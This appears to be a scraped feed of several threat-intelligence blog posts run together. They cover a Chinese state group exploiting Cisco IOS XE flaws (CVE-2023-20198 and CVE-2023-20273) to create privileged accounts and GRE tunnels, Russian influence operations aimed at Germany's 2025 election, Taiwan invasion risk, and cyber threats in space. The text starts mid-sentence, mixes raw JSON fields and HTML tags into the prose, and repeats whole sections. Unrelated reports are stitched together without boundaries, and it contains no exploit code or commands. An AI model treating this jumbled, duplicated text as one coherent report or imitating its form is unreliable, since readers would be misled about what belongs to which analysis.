Typhoon is a group name given by Microsoft Threat Intelligence; at this time, Microsoft has not published publicly available technical details of the group's activity. The only public information Microsoft has shared confirms an overlap with two existing threat activity group names: GhostEmperor (Kaspersky) and FamousSparrow (ESET).\nOn January 17, 2025, the US Department of the Treasury’s Office of Foreign Assets Control (OFAC) sanctioned Sichuan-based cybersecurity company Sichuan Juxinhe Network Technology Co., Ltd. for their direct involvement with RedMike activity. OFAC stated that Sichuan Juxinhe Network Technology Co., Ltd. had direct involvement in exploiting US telecommunications and internet service provider companies. According to OFAC, China’s Ministry of State Security (MSS) has maintained strong ties with multiple computer network exploitation companies, including Sichuan Juxinhe.\nTechnical Analysis\nCisco IOS XE Web UI Exploitation\nUsing Recorded Future Network Intelligence, Insikt Group identified that since early December 2024, RedMike has attempted to exploit over 1,000 internet-facing Cisco network devices worldwide, primarily those associated with telecommunications providers, using a combination of two privilege escalation vulnerabilities: CVE-2023-20198 and CVE-2023-20273. When successfully compromised, the group uses the new privileged user account to change the device's configuration and adds a GRE tunnel for persistent access and data exfiltration.\nThe privilege escalation vulnerability CVE-2023-20198 was found in the Cisco IOS XE software web UI feature, version 16 and earlier, and published by Cisco in October 2023. Attackers exploit this vulnerability to gain initial access to the device and issue a privilege 15 command to create a local user and password. Following this, the attacker uses the new local account to access the device and exploits an associated privilege escalation vulnerability, CVE-2023-20273, to gain root user privileges.\nFigure 1: RedMike Cisco network device exploitation infrastructure (Source: Recorded Future)\nMore than half of the Cisco devices targeted by RedMike were in the US, South America, and India. The remaining devices spanned over 100 other countries. Although the selected devices are primarily associated with telecommunications providers, thirteen were linked to universities across Argentina, Bangladesh, Indonesia, Malaysia, Mexico, the Netherlands, Thailand, the US, and Vietnam.\nOften involved in cutting-edge research, universities are prime targets for Chinese state-sponsored threat activity groups to acquire valuable research data and intellectual property. Previous examples include APT40, which has targeted universities for biomedical, robotics, and maritime research; RedGolf (APT41) for medical research; and RedBravo (APT31), which has directly targeted academics. China’s cyber strategy aligns with its broader economic and military goals, making universities high-value targets for long-term intelligence-gathering and technology acquisition.\nRedMike possibly targeted the following universities to access research in areas related to telecommunications, engineering, and technology, particularly at institutions like UCLA and TU Delft.\nUniversity of California, Los Angeles (UCLA) — US\nCalifornia State University, Office of the Chancellor (CENIC) — US\nLoyola Marymount University — US\nUtah Tech University — US\nUniversidad de La Punta — Argentina\nIslamic University of Technology (IUT) — Bangladesh\nUniversitas Sebelas Maret — Indonesia\nUniversitas Negeri Malang — Indonesia\nUniversity of Malaya — Malaysia\nUniversidad Nacional Autonoma — Mexico\nTechnische Universiteit Delft — The Netherlands\nSripatum University — Thailand\nUniversity of Medicine and Pharmacy at Ho Chi Minh City — Vietnam\nFigure 2: Geographical spread of Cisco devices targeted by RedMike (Source: Recorded Future)\nRedMike’s scanning and exploitation activity occurred on six different occasions from December 2024 to January 2025.\n2024-12-04\n2024-12-10\n2024-12-17\n2024-12-24\n2025-01-13\n2025-01-23\nNetwork administrators operating a Cisco network device with IOS XE software web UI exposed to the internet can use the dates mentioned and advice in the mitigations section to identify potential RedMike exploitation activity.\nUsing internet scanning data, Insikt Group identified more than 12,000 Cisco network devices with their web UIs exposed to the internet. Although over 1,000 Cisco devices were targeted, Insikt Group assesses that this activity was likely focussed, given that this number only represents 8% of the exposed devices and that RedMike engaged in periodic reconnaissance activity, selecting devices linked to telecommunications providers.\nCompromised Telecommunications Provider Devices\nUsing Recorded Future Network Intelligence, Insikt Group observed seven compromised Cisco network devices communicating with RedMike infrastructure. These include devices associated with:\nA US-based affiliate of a UK telecommunications provider\nA US internet service provider (ISP) and telecommunications company\nA South African telecommunications provider\nAn Italian ISP\nA large Thailand telecommunications provider\nRedMike configured GRE tunnels between the compromised Cisco devices and their infrastructure. GRE is a tunneling protocol used to encapsulate various network layer protocols inside point-to-point connections. It is a standard feature that can be configured on Cisco network devices. It is commonly used to create virtual private networks (VPNs), enable interoperability between different network types, and transport multicast or non-IP traffic over IP networks. Threat activity groups use GRE tunnels to maintain persistence by establishing covert communication channels that bypass firewalls and intrusion detection systems. These tunnels also facilitate stealthy data exfiltration by encapsulating stolen data within GRE packets, potentially bypassing network monitoring.\nReconnaissance of Myanmar Telecommunications Provider\nIn mid-December 2024, RedMike, from the same infrastructure that exploited the Cisco network devices, performed reconnaissance against multiple infrastructure assets operated by a Myanmar-based telecommunications provider, Mytel, likely including their corporate mail server.\nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_11a360aaa63760e50d1a130ba3facc7c08c958b09.png?width=1200&format=pjpg&optimize=medium"},"content":"Discover how Chinese state-sponsored group RedMike exploited unpatched Cisco devices, targeting telecommunications providers globally.

As of mid-February 2025, Insikt Group assesses that, despite their persistence, these efforts have very likely not meaningfully altered voter behavior or shaped public opinion in a manner advantageous to Russia’s broader geopolitical interests, consistent with <a href=\"https://www.brookings.edu/articles/the-impact-of-russian-interference-on-germanys-2017-elections/\">assessments</a> of Russian meddling attempts in previous German election cycles.</p>\n        <p>The influence operations and corresponding networks tracked in this report — Doppelgänger, Operation Overload, CopyCop, Operation Undercut, and the Russia-based Foundation to Battle Injustice — are longstanding and at least partially Kremlin-funded. These operations almost certainly seek to incite and escalate German domestic socio-political conflicts, pollute the German information space by introducing manipulated content, foster criticism of the United States (US) and European Union (EU) and European integration, and undermine North Atlantic Treaty Organization (NATO) cohesion in line with the Kremlin’s strategic objectives.</p>\n        <p>The 2025 German election cycle marks a period of evolution for several of these operations, while core narratives remain unchanged. For example, Doppelgänger and Operation Overload have expanded beyond mainstream social media to Bluesky Social (Bluesky), in an attempt to capture migrating audiences. Doppelgänger and CopyCop have launched new brands and websites to project influence and reinforce messaging in the face of intensified scrutiny of their operations. Operation Overload continues to use artificial intelligence (AI)-based tools, including the use of AI-enabled voice cloning technology to create audio deepfakes, while both Operation Overload and Operation Undercut pose as real news organizations to increase their credibility.</p>\n        <p>Despite limited evidence that these operations have meaningfully influenced voter behavior, they still pose broader risks to media integrity and public trust. Narratives undermining election security or integrity could reduce voter turnout, while media engagement with inauthentic content — rather than exposing the tactics behind it — may amplify malign messaging. Regarding Operation Overload specifically, we continue to assess that the potential for significant breakout does exist, as evidenced in the <a href=\"https://meduza.io/en/feature/2025/02/06/elon-musk-and-trump-jr-repost-fake-e-news-video-about-usaid-created-by-pro-kremlin-disinformation-network\">viral spread</a> of a recent video attributed to this network that disparaged the United States Agency for International Development (USAID) in social media. To mitigate these risks, media entities, the public sector, and researchers should continue monitoring known influence networks while limiting engagement with operations such as Doppelgänger, Operation Overload, and Operation Undercut. Impersonated organizations should engage takedown services for malicious domains, collaborate with platform trust and safety teams, and proactively detect brand abuse tactics like typosquatting and logo manipulation.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>The German federal elections are the target of malign influence operations attributed to Russia and Russia-based actors.</li>\n          <li>Russia-attributed influence operations have promoted and will very likely continue to support German political parties Russia views as beneficial to its own geopolitical interests, particularly Alternative für Deutschland (AfD).</li>\n          <li>Doppelgänger is very likely exerting influence through at least seven new inauthentic news brands, in addition to the operation’s persistent media impersonation activities, to exacerbate political fissures and inflame political discourse surrounding European integration, immigration, and economic matters.</li>\n          <li>Operation Overload’s media impersonations aim to sow distrust among German citizens toward the safety and integrity of voting, attack the characters of key political leaders, and present Germany as a rising hotbed of antisemitism and extremism.</li>\n          <li>Insikt Group detected at least 94 new inauthentic websites –– whose creation began in November 2024 after the announcement of upcoming snap elections –– that we attribute to CopyCop impersonating German-language news websites.</li>\n          <li>Following Insikt Group’s November 2024 investigation into Operation Undercut, we have observed the network continuing to post German-language content supporting AfD and undermining German Chancellor Olaf Scholz.</li>\n          <li>The Foundation to Battle Injustice very likely seeks to undermine the reputations of German political leaders while promoting political platforms aligned with Russian interests through inauthentic investigative articles.</li>\n        </ul>\n        <h2>New Doppelgänger “Brands” Target Key German Election Issues</h2>\n        <p>Insikt Group has detected at least eight new websites acting as original news brands, in addition to continued media impersonation with social media promotion, which we attribute to Doppelgänger, a longstanding Russian influence operation. <a href=\"https://www.disinfo.eu/doppelganger-operation/\">Doppelgänger</a> is very likely positioning these newly established websites — previously not linked to the network — to sustain its influence operations targeting European political leadership and to exacerbate political fissures surrounding European integration, immigration, economic matters, and more. Throughout 2024, researchers, government entities, and technology companies <a href=\"https://www.qurium.org/alerts/exposing-the-evil-empire-of-doppelganger-disinformation/\">continued</a> <a href=\"https://www.qurium.org/forensics/when-kehr-meets-vextrio/\">exposing</a> Doppelgänger's activities across Europe and North America, leading to a US Department of Justice <a href=\"https://www.justice.gov/opa/pr/justice-department-disrupts-covert-russian-government-sponsored-foreign-malign-influence\">indictment</a> against its operators at the Social Design Agency (SDA), international sanctions on SDA and affiliated entities, and at least partial — though often temporary — disruptions to its operations through takedowns and seizures. In response, SDA typically attempted to reestablish its operations within hours to days by deploying new infrastructure.</p>\n        <p>While Doppelgänger is best known for the <a href=\"https://www.disinfo.eu/doppelganger/\">direct impersonation</a> of legitimate Western media organizations, the influence operation has also managed a multitude of its own original news website “brands”, each targeting a specific country (such as Germany), with content directly tailored to the key domestic and foreign policy issues of that target audience, such as immigration policy, Germany’s ongoing socio-economic challenges, and questions of Germany’s place as Europe’s leader (as seen in <strong>Figure 1</strong>). Insikt Group has observed Doppelgänger abandoning several of its “legacy” brand websites with attempts to establish new brands, including multiple websites specific to German politics, likely due to a combination of repeated discovery and disruption of several of these websites.</p>\n        <p>While we continue to observe Doppelgänger evolve its tactics and attempt to evade defenders, its ability to meaningfully impact public discourse very likely remains limited. Despite continued efforts to expand its network, Doppelgänger remains constrained by low levels of engagement, with minimal views and interactions across its newly launched domains and social media brands.</p>\n        <h3>Using New Infrastructure to Deliver Old Themes</h3>\n        <p>Since October 2024, Insikt Group has tracked a series of new domain registrations, discovering web page infrastructure that overlaps with previously attributed Doppelgänger-controlled domains. As of February 2025, Doppelgänger has registered ten domains that include eight new websites and two “parked” domains.

As of mid-February 2025, Insikt Group assesses that, despite their persistence, these efforts have very likely not meaningfully altered voter behavior or shaped public opinion in a manner advantageous to Russia’s broader geopolitical interests, consistent with assessments of Russian meddling attempts in previous German election cycles.\nThe influence operations and corresponding networks tracked in this report — Doppelgänger, Operation Overload, CopyCop, Operation Undercut, and the Russia-based Foundation to Battle Injustice — are longstanding and at least partially Kremlin-funded. These operations almost certainly seek to incite and escalate German domestic socio-political conflicts, pollute the German information space by introducing manipulated content, foster criticism of the United States (US) and European Union (EU) and European integration, and undermine North Atlantic Treaty Organization (NATO) cohesion in line with the Kremlin’s strategic objectives.\nThe 2025 German election cycle marks a period of evolution for several of these operations, while core narratives remain unchanged. For example, Doppelgänger and Operation Overload have expanded beyond mainstream social media to Bluesky Social (Bluesky), in an attempt to capture migrating audiences. Doppelgänger and CopyCop have launched new brands and websites to project influence and reinforce messaging in the face of intensified scrutiny of their operations. Operation Overload continues to use artificial intelligence (AI)-based tools, including the use of AI-enabled voice cloning technology to create audio deepfakes, while both Operation Overload and Operation Undercut pose as real news organizations to increase their credibility.\nDespite limited evidence that these operations have meaningfully influenced voter behavior, they still pose broader risks to media integrity and public trust. Narratives undermining election security or integrity could reduce voter turnout, while media engagement with inauthentic content — rather than exposing the tactics behind it — may amplify malign messaging. Regarding Operation Overload specifically, we continue to assess that the potential for significant breakout does exist, as evidenced in the viral spread of a recent video attributed to this network that disparaged the United States Agency for International Development (USAID) in social media. To mitigate these risks, media entities, the public sector, and researchers should continue monitoring known influence networks while limiting engagement with operations such as Doppelgänger, Operation Overload, and Operation Undercut. Impersonated organizations should engage takedown services for malicious domains, collaborate with platform trust and safety teams, and proactively detect brand abuse tactics like typosquatting and logo manipulation.\nKey Findings\nThe German federal elections are the target of malign influence operations attributed to Russia and Russia-based actors.\nRussia-attributed influence operations have promoted and will very likely continue to support German political parties Russia views as beneficial to its own geopolitical interests, particularly Alternative für Deutschland (AfD).\nDoppelgänger is very likely exerting influence through at least seven new inauthentic news brands, in addition to the operation’s persistent media impersonation activities, to exacerbate political fissures and inflame political discourse surrounding European integration, immigration, and economic matters.\nOperation Overload’s media impersonations aim to sow distrust among German citizens toward the safety and integrity of voting, attack the characters of key political leaders, and present Germany as a rising hotbed of antisemitism and extremism.\nInsikt Group detected at least 94 new inauthentic websites –– whose creation began in November 2024 after the announcement of upcoming snap elections –– that we attribute to CopyCop impersonating German-language news websites.\nFollowing Insikt Group’s November 2024 investigation into Operation Undercut, we have observed the network continuing to post German-language content supporting AfD and undermining German Chancellor Olaf Scholz.\nThe Foundation to Battle Injustice very likely seeks to undermine the reputations of German political leaders while promoting political platforms aligned with Russian interests through inauthentic investigative articles.\nNew Doppelgänger “Brands” Target Key German Election Issues\nInsikt Group has detected at least eight new websites acting as original news brands, in addition to continued media impersonation with social media promotion, which we attribute to Doppelgänger, a longstanding Russian influence operation. Doppelgänger is very likely positioning these newly established websites — previously not linked to the network — to sustain its influence operations targeting European political leadership and to exacerbate political fissures surrounding European integration, immigration, economic matters, and more. Throughout 2024, researchers, government entities, and technology companies continued exposing Doppelgänger's activities across Europe and North America, leading to a US Department of Justice indictment against its operators at the Social Design Agency (SDA), international sanctions on SDA and affiliated entities, and at least partial — though often temporary — disruptions to its operations through takedowns and seizures. In response, SDA typically attempted to reestablish its operations within hours to days by deploying new infrastructure.\nWhile Doppelgänger is best known for the direct impersonation of legitimate Western media organizations, the influence operation has also managed a multitude of its own original news website “brands”, each targeting a specific country (such as Germany), with content directly tailored to the key domestic and foreign policy issues of that target audience, such as immigration policy, Germany’s ongoing socio-economic challenges, and questions of Germany’s place as Europe’s leader (as seen in Figure 1). Insikt Group has observed Doppelgänger abandoning several of its “legacy” brand websites with attempts to establish new brands, including multiple websites specific to German politics, likely due to a combination of repeated discovery and disruption of several of these websites.\nWhile we continue to observe Doppelgänger evolve its tactics and attempt to evade defenders, its ability to meaningfully impact public discourse very likely remains limited. Despite continued efforts to expand its network, Doppelgänger remains constrained by low levels of engagement, with minimal views and interactions across its newly launched domains and social media brands.\nUsing New Infrastructure to Deliver Old Themes\nSince October 2024, Insikt Group has tracked a series of new domain registrations, discovering web page infrastructure that overlaps with previously attributed Doppelgänger-controlled domains. As of February 2025, Doppelgänger has registered ten domains that include eight new websites and two “parked” domains. The active domains reflect seven news brands that target German-speaking audiences:\nherzheim[.]org\nkriminalradar[.]com\nmilitarblatt[.]net\nostlicherwind[.]com\nstolzvolk[.]ac\nstolzvolk[.]org (currently offline)\ntageswirtschaft[.]org\nweltwahl[.]com (currently offline)\ndetechplus[.]com (parked)\nsportbericht[.]net (parked)\nFigure 1: New Doppelgänger domains specific to Germany and German-speaking audiences (Source: Recorded Future)\nFigure 2: The seven new Doppelgänger brands targeting Germany and German-speaking audiences (Source: Recorded Future)\nEach of the active websites uses distinct IP addresses, listed below, with the exception of weltwahl[.]com and stolzvolk[.]org, which both share 15.197.130[.]221.

While an invasion in the short term (2025–2026) is currently unlikely, the factors informing Insikt Group’s assessment are rapidly evolving. Beginning in 2027 and continuing through the long term (2027–2049), the risk of an invasion will very likely continue to increase, though it is not inevitable that an invasion will occur. In the short term, China is almost certain to continue its current coercive efforts, including major military exercises and incursions into maritime and air spaces near Taiwan, while seeking ways to incrementally escalate such coercion below the level of an invasion. In these efforts, China is likely to initiate a temporary law enforcement-led quarantine and a disruptive cyber campaign against Taiwan’s critical infrastructure​​.</p>\n        <p>Our assessment is based on a range of behaviors and trends across China, Taiwan, and the United States (US), as described in the <strong>Key Findings</strong> below, and in consideration of China’s broader geopolitical context (see <strong>Appendix A</strong>). Fundamentally, in the short term, we assess that — absent a specific catalyst that leads to war (such as if Taiwan were to declare formal independence) — the Chinese Communist Party (CCP) leadership is very likely to remain focused on improving domestic conditions and strengthening preparations for navigating tensions with the US, a potential invasion of Taiwan, or other conflict with foreign powers (such as over the South China Sea). In the long term, we assess that China will likely have established a level of preparedness across the military, economic, social, and other domains by 2027 that would enable its leadership to invade Taiwan as a “war of choice” (rather than in response to a specific catalyst) while minimizing associated costs and risks.</p>\n        <p>Our assessment is generally aligned with public statements by Taiwan and US government and military officials since the start of 2023, both of which emphasize active preparations regardless of speculation about specific timelines. More specifically, Taiwan officials express that an invasion is currently unlikely despite the potential for a diversionary war to distract from China’s domestic economic challenges. They also highlight weaknesses in the People’s Liberation Army’s (PLA’s) amphibious capability while recognizing the PLA could likely execute a blockade of Taiwan — the foremost alternative to an invasion. US officials express that an invasion is not imminent or inevitable, but that the risk is increasing and that China’s forces are on track to meet their modernization and readiness goals.</p>\n        <p>An invasion would almost certainly severely impact the global economy, disrupting critical shipping lanes, devastating the semiconductor industry, and imposing broad costs on Taiwan, China, and potentially the US. Businesses likely to be affected by a Taiwan invasion scenario should consider taking steps such as building relationships with potential alternative suppliers outside of Asia, evaluating the purchase of war risk insurance, conducting scenario-based stress tests to identify vulnerabilities in operations and investments, maintaining encrypted offline backups of key computer systems and data, isolating high-value computer systems to limit an adversary’s lateral movement in case of a breach, and purchasing a geopolitical threat intelligence capability to support ongoing monitoring of the Taiwan issue (additional recommendations can be found in the <strong>Preparing for Potential Global Economic Disruption</strong> section of this report). Indicators of escalation to support monitoring are provided in <strong>Appendix B</strong>. Given the public focus on the impact of an invasion on Taiwan’s semiconductor industry, <strong>Appendix C</strong> further offers our assessment of why that industry is not especially relevant to judging if or when China might invade.</p>\n        <h2>Key Findings</h2>\n        <p>Assessments supporting our judgment that an invasion is unlikely in the short term include:</p>\n        <p>China almost certainly continues to prefer “peaceful reunification” and very likely continues to invest in a dual-track strategy that combines economic inducements with coercive elements. China’s economy is facing challenges that are very likely holding the focus of leadership as they strive to attain national rejuvenation. Despite PLA progress in developing capabilities necessary for a successful invasion of Taiwan, China’s military continues to have limitations in areas that suggest it is not yet ready to undertake an invasion. China’s leadership has likely not begun telling the public to prepare for war and public support for a war is likely not at levels the CCP would prefer before ordering an invasion. Although long-term public opinion trends in Taiwan are unfavorable to China’s goals, polling results since 2020 likely suggest to China’s leadership that its strategy is working to curb preferences for independence in the short term.</p>\n        <p>Assessments supporting our judgment of rising risk in the long term include:</p>\n        <p>The CCP has become increasingly assertive and very likely expectant of progress with regard to its goals for Taiwan. Under Xi Jinping’s leadership, the CCP has taken administrative and other measures to develop a self-sufficient economy, harden against foreign economic coercion such as sanctions, decrease reliance on the US dollar, and prepare for shortages in strategic resources like grain and critical minerals. China-based cyber threat actors are targeting US critical infrastructure in ways that suggest their goal is to pre-position for a potential conflict. China’s leadership has intensified its use of “lawfare” measures against Taiwan, particularly over the past year. The PLA, China’s wider armed forces, and China’s defense industry are continuing to improve capabilities that would be needed for a successful invasion of Taiwan, countering US intervention, and other scenarios. The political and social environments in Taiwan are both trending toward potentially permanent rejection of unification. China’s leadership almost certainly perceives US government behavior as trending toward overturning its (the US’s) “one-China” policy, which is one of Beijing’s likely “red lines” that could hasten an invasion scenario.</p>\n        <h2>Indicators an Invasion Is Unlikely in the Short Term</h2>\n        <p>There are several elements of China’s behavior that support our assessment that a Taiwan invasion is unlikely before 2027. These include China’s almost certain continuing preference for “peaceful reunification”, indicators that it very likely continues to pursue a dual-track approach to Taiwan, economic challenges that very likely take priority given China’s other ambitions, shortfalls in PLA capability, and limited indication that China has begun mobilizing its populace to brace for wartime hardship. Additionally, public opinion polling results in Taiwan since 2020 likely suggest to China’s leadership that its coercive strategy is working to deter independence in the short term. In totality, we assess that — absent a specific catalyst that leads to war (such as if Taiwan declares formal independence or China assesses foreign military interference in Taiwan) — the CCP leadership is very likely, in the short term, to remain focused on improving domestic conditions and strengthening preparations for navigating tensions with the US, a potential invasion, or other conflict with a foreign power (for example, over the South China Sea).</p>\n        <h3>Trends in China</h3>\n        <p>China almost certainly continues to prefer “peaceful reunification” and very likely continues to invest in a dual-track strategy that combines economic inducements with coercive elements.

While an invasion in the short term (2025–2026) is currently unlikely, the factors informing Insikt Group’s assessment are rapidly evolving. Beginning in 2027 and continuing through the long term (2027–2049), the risk of an invasion will very likely continue to increase, though it is not inevitable that an invasion will occur. In the short term, China is almost certain to continue its current coercive efforts, including major military exercises and incursions into maritime and air spaces near Taiwan, while seeking ways to incrementally escalate such coercion below the level of an invasion. In these efforts, China is likely to initiate a temporary law enforcement-led quarantine and a disruptive cyber campaign against Taiwan’s critical infrastructure​​.\nOur assessment is based on a range of behaviors and trends across China, Taiwan, and the United States (US), as described in the Key Findings below, and in consideration of China’s broader geopolitical context (see Appendix A). Fundamentally, in the short term, we assess that — absent a specific catalyst that leads to war (such as if Taiwan were to declare formal independence) — the Chinese Communist Party (CCP) leadership is very likely to remain focused on improving domestic conditions and strengthening preparations for navigating tensions with the US, a potential invasion of Taiwan, or other conflict with foreign powers (such as over the South China Sea). In the long term, we assess that China will likely have established a level of preparedness across the military, economic, social, and other domains by 2027 that would enable its leadership to invade Taiwan as a “war of choice” (rather than in response to a specific catalyst) while minimizing associated costs and risks.\nOur assessment is generally aligned with public statements by Taiwan and US government and military officials since the start of 2023, both of which emphasize active preparations regardless of speculation about specific timelines. More specifically, Taiwan officials express that an invasion is currently unlikely despite the potential for a diversionary war to distract from China’s domestic economic challenges. They also highlight weaknesses in the People’s Liberation Army’s (PLA’s) amphibious capability while recognizing the PLA could likely execute a blockade of Taiwan — the foremost alternative to an invasion. US officials express that an invasion is not imminent or inevitable, but that the risk is increasing and that China’s forces are on track to meet their modernization and readiness goals.\nAn invasion would almost certainly severely impact the global economy, disrupting critical shipping lanes, devastating the semiconductor industry, and imposing broad costs on Taiwan, China, and potentially the US. Businesses likely to be affected by a Taiwan invasion scenario should consider taking steps such as building relationships with potential alternative suppliers outside of Asia, evaluating the purchase of war risk insurance, conducting scenario-based stress tests to identify vulnerabilities in operations and investments, maintaining encrypted offline backups of key computer systems and data, isolating high-value computer systems to limit an adversary’s lateral movement in case of a breach, and purchasing a geopolitical threat intelligence capability to support ongoing monitoring of the Taiwan issue (additional recommendations can be found in the Preparing for Potential Global Economic Disruption section of this report). Indicators of escalation to support monitoring are provided in Appendix B. Given the public focus on the impact of an invasion on Taiwan’s semiconductor industry, Appendix C further offers our assessment of why that industry is not especially relevant to judging if or when China might invade.\nKey Findings\nAssessments supporting our judgment that an invasion is unlikely in the short term include:\nChina almost certainly continues to prefer “peaceful reunification” and very likely continues to invest in a dual-track strategy that combines economic inducements with coercive elements. China’s economy is facing challenges that are very likely holding the focus of leadership as they strive to attain national rejuvenation. Despite PLA progress in developing capabilities necessary for a successful invasion of Taiwan, China’s military continues to have limitations in areas that suggest it is not yet ready to undertake an invasion. China’s leadership has likely not begun telling the public to prepare for war and public support for a war is likely not at levels the CCP would prefer before ordering an invasion. Although long-term public opinion trends in Taiwan are unfavorable to China’s goals, polling results since 2020 likely suggest to China’s leadership that its strategy is working to curb preferences for independence in the short term.\nAssessments supporting our judgment of rising risk in the long term include:\nThe CCP has become increasingly assertive and very likely expectant of progress with regard to its goals for Taiwan. Under Xi Jinping’s leadership, the CCP has taken administrative and other measures to develop a self-sufficient economy, harden against foreign economic coercion such as sanctions, decrease reliance on the US dollar, and prepare for shortages in strategic resources like grain and critical minerals. China-based cyber threat actors are targeting US critical infrastructure in ways that suggest their goal is to pre-position for a potential conflict. China’s leadership has intensified its use of “lawfare” measures against Taiwan, particularly over the past year. The PLA, China’s wider armed forces, and China’s defense industry are continuing to improve capabilities that would be needed for a successful invasion of Taiwan, countering US intervention, and other scenarios. The political and social environments in Taiwan are both trending toward potentially permanent rejection of unification. China’s leadership almost certainly perceives US government behavior as trending toward overturning its (the US’s) “one-China” policy, which is one of Beijing’s likely “red lines” that could hasten an invasion scenario.\nIndicators an Invasion Is Unlikely in the Short Term\nThere are several elements of China’s behavior that support our assessment that a Taiwan invasion is unlikely before 2027. These include China’s almost certain continuing preference for “peaceful reunification”, indicators that it very likely continues to pursue a dual-track approach to Taiwan, economic challenges that very likely take priority given China’s other ambitions, shortfalls in PLA capability, and limited indication that China has begun mobilizing its populace to brace for wartime hardship. Additionally, public opinion polling results in Taiwan since 2020 likely suggest to China’s leadership that its coercive strategy is working to deter independence in the short term. In totality, we assess that — absent a specific catalyst that leads to war (such as if Taiwan declares formal independence or China assesses foreign military interference in Taiwan) — the CCP leadership is very likely, in the short term, to remain focused on improving domestic conditions and strengthening preparations for navigating tensions with the US, a potential invasion, or other conflict with a foreign power (for example, over the South China Sea).\nTrends in China\nChina almost certainly continues to prefer “peaceful reunification” and very likely continues to invest in a dual-track strategy that combines economic inducements with coercive elements. While the coercive elements of the CCP’s strategy — including large-scale military exercises (reportedly with cyber components), air defense identification zone (ADIZ) incursions, and expanding law enforcement patrols around Taiwan’s outlying islands — receive the most attention, examples of the other side of CCP strategy include the following: a June 2024 plan to “deepen cross-strait innovation and development cooperation” in Dongguan city, January 2024 reforms in Fujian that created new government offices for Taiwan work, and a September 2023 plan to build a “cross-strait integrated development demonstration zone” in Fujian province, and 68 other preferential policies and measures targeting Taiwan businesses in China between 2018 and 2020. Xi Jinping’s activities in October 2024 also very likely signal this dual-track approach, omitting references to “peace” in statements relevant to Taiwan and visiting locations significant to China’s civil war history while also calling for greater integrated development. On January 15, 2025, a spokesperson for the Taiwan Affairs Office reiterated that integrated development is a focal point for the coming year. Additionally, there is almost certainly still no strict deadline for achieving unification.\nChina’s economy is in a period of transition, volatility, and struggle, facing challenges that are very likely holding the focus of leadership as it strives to attain national rejuvenation and continue preparing for potential armed conflict. China’s challenges include a depressed property market, deflation, high local government debt, declining foreign investment, elevated youth unemployment, and lingering dependence on critical foreign technology like semiconductor production tools (for more on the relevance of semiconductors in China’s likely Taiwan invasion calculus, see Appendix C), while shifting toward “a green, high-tech” structure. These and other challenges have led to arguments that China could invade Taiwan to distract from domestic troubles (1, 2, 3, 4), but this is unlikely. First, diversionary war has not been the CCP’s method for managing domestic crises since 1949. Second, the economic challenges are likely not great enough to derail the PLA’s ongoing modernization in ways that would limit China’s option to use force in the future. During this period, Xi Jinping is very likely to focus on solving domestic economic problems while strengthening the military to support conditions for achieving national rejuvenation by 2049 — a goal with an economic component — and to prepare for unifying with Taiwan through force if doing so is deemed necessary.\nDespite PLA progress toward developing capabilities necessary for a successful invasion of Taiwan (discussed further below), China’s military continues to have limitations in areas that suggest it is not yet ready to undertake such a high-risk operation. These limitations very likely include a lack of sealift capacity for an invasion of Taiwan, inadequate rapid runway repair capabilities to restore air operations following enemy assaults, difficulty integrating submarine forces into joint operations, and helicopter forces that have readiness and operational capacity limitations. Corruption also continues to be a major challenge for the PLA and China’s defense industry, potentially disrupting the military’s organizational command, the quality of its personnel, its preparedness for warfare, and the attainment of its modernization goals.\nChina’s leadership has likely not begun telling the public to prepare for war and public support for a war is likely not at levels the CCP would prefer before ordering an invasion. This point is debated, with some analysts focusing on Xi Jinping’s warning that “the stormy seas of a major test” are looming, his emphasis on “worst-case scenario thinking”, and the CCP’s escalating rhetoric targeting Taiwan.

This white paper explores the key components shaping this modern space race and highlights how cyberattacks are already influencing its trajectory. Cyber operations will play a critical role in determining who dominates the second space race. As this new race accelerates, so too will the frequency and sophistication of cyberattacks targeting organisations operating in the space domain. Understanding how cyberattacks are reshaping this race is critical to protecting global economies, military operations, and the future of national security.\nWhat is currently happening?\nNation-states are swiftly adapting their militaries to compete in space, a largely unregulated domain abundant with resources. History has shown that advanced nations often exploit new frontiers, and space is no exception. With its virtually limitless resources, space has become a critical battleground.\nEarth’s orbit is already highly contested, hosting satellites essential to global economies and military operations. Many of these satellites have been victims of cyberattacks, a trend that is certain to intensify. However, the focus extends beyond Earth’s ground stations and orbit, where we see espionage, destructive attacks, supply chain compromise, and signal hijacking. Nation-states are now setting their sights on deeper space, and that is where our attention must also turn.\nWhat is going to happen?\nThe initial stage of Space Race 2.0 centers on Earth’s orbit, but the Moon, asteroids, and planets hold vast resources with the potential to transform nation-states in ways we can only begin to imagine. Efforts are already underway to colonize the Moon, mine asteroids, and establish a presence on habitable worlds beyond Earth.\nFigure 1: Stages of the space race that are unfolding.\nAs these ambitions grow, so will efforts to outmaneuver rival nations. Cyber capabilities will play a critical role, as adversaries seek to steal information or disrupt operations. Ground stations, communication signals, and the supply chains supporting space assets are vulnerable to cyberattacks. As such, space-related organisations and companies must prioritize robust cybersecurity measures to protect their operations in this emerging domain. At an operational level, researchers are advancing frameworks like SPARTA to stay ahead of evolving tactics, techniques, and procedures\nFigure 2: Space Attack Research & Tactic Analysis (SPARTA) from https://sparta.aerospace.org/.\nAt the strategic level, industry and government are convening more frequently at conferences like Defence Space 24 to address the growing cyber threats in the space domain.\nFigure 3: Defence Space 24 was hosted in London at the end of September 2024. Government, military, and industry representatives attended the event.\nAt a nation-state level, militaries are increasingly integrating intelligence and cyber capabilities into their space operations, with U.S. Space Command serving as a prominent example.\nConclusion This white paper explores the intersection of space exploration and cybersecurity, delving into the challenges and opportunities shaping this evolving frontier. The stakes could not be higher: dominance in cyberspace directly translates to dominance in outer space, where control will determine humanity’s future trajectory beyond Earth. As such, the convergence of space and cyber is critical and demands our full attention.\nThe Convergence of Space and Cyber\nUnderstand the evolving threat landscape\nDownload whitepaper","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/blog/media_14fcb249bcb15799bd4500bd63d1b0e3b53e78eb2.png?width=1200&format=pjpg&optimize=medium"},"content":"Explore the critical role of cyberattacks in shaping the modern space race.

